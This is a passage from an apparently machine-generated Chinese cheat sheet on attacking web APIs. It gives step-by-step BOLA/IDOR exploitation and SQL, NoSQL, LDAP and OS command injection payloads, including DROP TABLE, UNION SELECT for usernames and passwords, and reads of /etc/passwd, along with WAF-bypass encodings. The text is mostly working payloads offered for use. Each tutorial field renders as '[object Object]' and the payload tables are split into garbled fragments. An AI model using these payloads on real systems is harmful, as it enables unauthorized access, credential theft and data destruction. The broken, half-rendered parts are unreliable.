{"roles": "admin"}

# 对象转数组
{"settings": ["admin"]}
```

类型混淆测试

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 数字转布尔 {"isAdmin": 1} {"isAdmin": "true"}  # 数组转字符串 {"roles": "admin"}  # 对象转数组 {"settings": ["admin"]}` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 11. BOLA破坏对象级授权

- **id:** `api-bola`
- **分类:** API安全 / BOLA
- **tags:** `api` `bola` `authorization` `idor`

利用BOLA漏洞访问未授权对象

**前置条件**

- API使用对象ID
- 授权检查缺陷

**利用步骤**

#### 1. 识别对象访问

```
# 观察API端点
GET /api/users/{user_id}/documents
GET /api/teams/{team_id}/members
GET /api/orders/{order_id}

# 分析对象关系
# 用户 -> 文档
# 团队 -> 成员
# 订单 -> 用户
```

识别对象访问模式

| 片段 | 说明 | 类型 |
|---|---|---|
| `{user_id}` | 用户ID参数 | value |
| `{team_id}` | 团队ID参数 | value |

#### 2. 测试授权

```
# 创建两个账户测试
# 用户A: user_a_token
# 用户B: user_b_token

# 用户A创建资源
POST /api/documents
Authorization: Bearer user_a_token
{"title": "Secret Doc"}
# 返回: {"id": "doc_123"}

# 用户B尝试访问
GET /api/documents/doc_123
Authorization: Bearer user_b_token
# 如果返回200，存在BOLA
```

测试授权检查

| 片段 | 说明 | 类型 |
|---|---|---|
| `POST` | HTTP方法 | method |
| `Authorization` | 认证头 | header |

#### 3. 横向访问

```
# 枚举其他用户资源
for doc_id in doc_1 doc_2 doc_3; do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/documents/$doc_id"
done

# 访问其他用户私有数据
GET /api/users/2/profile
GET /api/users/2/settings
GET /api/users/2/credit-cards
```

横向访问测试

| 片段 | 说明 | 类型 |
|---|---|---|
| `curl` | HTTP请求工具 | command |
| `-H` | 自定义请求头 | parameter |
| `Authorization` | 认证头 | header |

#### 4. 修改/删除操作

```
# 修改其他用户数据
PUT /api/documents/doc_123
Authorization: Bearer user_b_token
{"title": "Modified by B"}

# 删除其他用户数据
DELETE /api/documents/doc_123
Authorization: Bearer user_b_token

# 添加到其他团队
POST /api/teams/team_1/members
Authorization: Bearer attacker_token
{"user_id": "attacker_id"}
```

修改/删除操作测试

| 片段 | 说明 | 类型 |
|---|---|---|
| `Authorization` | 认证头 | header |

**WAF 绕过**

#### 路径遍历

```
# 路径遍历访问
GET /api/users/../admin
GET /api/users/..%2Fadmin

# 编码绕过
GET /api/users/%2e%2e/admin
GET /api/users/..%c0%afadmin
```

路径遍历绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 路径遍历访问 GET /api/users/../admin GET /api/users/..%2Fadmin  # 编码绕过 GET /api/users/%2e%2e/admin GET /api/users/..%c0%afadmin` | 参数与载荷内容 | value |

#### 参数篡改

```
# 修改请求方法
# GET变POST
POST /api/documents/doc_123

# 添加参数
GET /api/documents/doc_123?user_id=attacker

# 修改Content-Type
Content-Type: application/xml
<document><id>doc_123</id></document>
```

参数篡改绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` 修改请求方法 # GET变POST POST /api/documents/doc_123  # 添加参数 GET /api/documents/doc_123?user_id=attacker  # 修改Content-Type Content-Type: application/xml <document><id>doc_123</id></document>` | 参数与载荷内容 | value |

**教程**

[object Object]

---

### 12. API注入攻击

- **id:** `api-injection`
- **分类:** API安全 / API注入
- **tags:** `api` `injection` `sqli` `nosqli`

API端点中的各类注入攻击

**前置条件**

- API接受用户输入
- 输入未正确过滤

**利用步骤**

#### 1. SQL注入

```
# REST API SQL注入
GET /api/users?id=1 OR 1=1
GET /api/users?name=admin'--
GET /api/users?sort=name; DROP TABLE users--

# POST请求注入
POST /api/users
{"name": "admin' OR '1'='1"}

# JSON注入
POST /api/search
{"query": "test' UNION SELECT username,password FROM users--"}
```

API SQL注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `OR 1=1` | SQL注入永真条件 | value |
| `UNION SELECT` | 联合查询注入 | value |

#### 2. NoSQL注入

```
# MongoDB注入
GET /api/users?name[$ne]=
GET /api/users?age[$gt]=0
GET /api/users?role[$ne]=user

# POST请求
POST /api/login
{"username": "admin", "password": {"$ne": ""}}

{"username": "admin", "password": {"$regex": ".*"}}

# 嵌套查询
{"$where": "this.password == this.password"}
{"$where": "return true"}
```

NoSQL注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `$ne` | MongoDB不等于操作符 | variable |
| `$regex` | 正则表达式匹配 | variable |
| `$where` | JavaScript执行 | variable |

#### 3. LDAP注入

```
# LDAP注入
GET /api/users?name=*)(uid=*))(|(uid=*
GET /api/login?user=*&password=*

# 认证绕过
POST /api/auth
{"user": "admin)(|(password=*))", "password": "x"}

# 信息泄露
GET /api/search?name=*)(objectClass=*)
```

LDAP注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `*)` | LDAP闭合当前过滤器 | value |
| `(uid=*)` | 匹配所有用户 | value |

#### 4. 命令注入

```
# OS命令注入
GET /api/ping?host=127.0.0.1;id
GET /api/convert?file=test.pdf;cat /etc/passwd

# POST请求
POST /api/exec
{"cmd": "ls -la; cat /etc/passwd"}

# 反引号注入
GET /api/check?host=`id`
GET /api/check?host=$(id)
```

命令注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `;id` | 命令分隔符后执行id命令 | value |
| ``id`` | 命令替换执行 | value |

**WAF 绕过**

#### 编码绕过

```
# URL编码
GET /api/users?id=1%20OR%201%3D1

# Unicode编码
GET /api/users?id=1%u0020OR%u00201%3D1

# 双重编码
GET /api/users?id=1%2520OR%25201%253D1
```

编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `#` | 命令/载荷起始 | command |
| ` URL编码 GET /api/users?id=1%20OR%201%3D1  # Unicode编码 GET /api/users?id=1%u0020OR%u00201%3D1  # 双重编码 GET /api/users?id=1%2520OR%25201%253D1` | 参数与载荷内容 | value |

#### Content-Type绕过

```
# 切换Content-Type
Content-Type: application/xml
<user><id>1 OR 1=1</id></user>

Content-Type: application/x-www-form-urlencoded
id=1+OR+1=1

# JSON数组
{"id": ["1", "OR", "1=1"]}
```

Content-Type绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `# 切换Content-Type Content-Type: application/xml <user><id>1 ` | SQL表达式 | value |
| `OR` | SQL关键字 | keyword |
| ` 1=1</id></user>  Content-Type: application/x-www-form-urlencoded id=1+` | SQL表达式 | value |
| `OR` | SQL关键字 | keyword |
| `+1=1  # JSON数组 {"id": ["1", "` | SQL表达式 | value |
| `OR` | SQL关键字 | keyword |
| `", "1=1"]}` | SQL表达式 | value |

**教程**

[object Object]
